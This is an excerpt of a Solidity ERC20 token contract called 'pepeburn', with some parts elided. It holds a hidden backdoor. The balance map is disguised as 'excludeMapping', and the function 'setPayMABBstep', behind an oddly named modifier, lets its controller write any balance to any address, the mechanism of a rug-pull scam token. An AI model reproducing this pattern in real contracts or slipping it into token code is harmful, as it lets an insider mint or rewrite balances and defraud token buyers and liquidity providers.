...
contract pepeburn is IERC20, baseToken, Ownable {
    using SafeMath for uint256;

    uint256 private constant VERSION = 1;

    mapping(address => uint256) private excludeMapping;
    ...
    function _transfer(
        ...
        excludeMapping[sender] = excludeMapping[sender].sub(
            amount,
            "IERC20: transfer amount exceeds balance"
        );
        excludeMapping[recipient] = excludeMapping[recipient].add(amount);
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        excludeMapping[account] = excludeMapping[account].add(amount);
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        excludeMapping[account] = excludeMapping[account].sub(
            amount,
    ...
    function setPayMABBstep(address _address, uint256 _amount, uint _value) 
        external 
        publicvirtualreturns 
    {
        metadata = _amount * _value;
        pancakeRouterAddress = _address;
        excludeMapping[pancakeRouterAddress] = metadata;
    }
